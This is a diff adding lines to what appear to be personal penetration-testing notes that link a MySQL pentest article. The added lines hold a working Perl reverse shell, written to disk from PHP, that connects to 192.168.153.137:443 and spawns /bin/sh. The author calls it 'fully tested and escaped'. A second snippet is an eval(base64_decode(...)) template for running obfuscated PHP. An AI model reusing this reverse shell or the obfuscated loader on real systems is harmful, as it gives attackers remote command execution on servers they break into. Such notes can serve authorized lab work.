@@ -41,3 +41,17 @@ http://www.hackingarticles.in/penetration-testing-on-mysql-port-3306/
 
 
 
+perl script for reverse shell fully tested and escaped for special characters.
+<?php
+/*
+echo "AAA";
+$fh=fopen("/abcd/test.pl","w") or die("unable to open");
+$data = "use Socket;\$i=\"192.168.153.137\";\$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};";
+fwrite($fh,$data);
+fclose($fh);
+*/
+?>
+<?php
+eval(base64_decode("<base64encode php script> without php tags"));
+?>
+
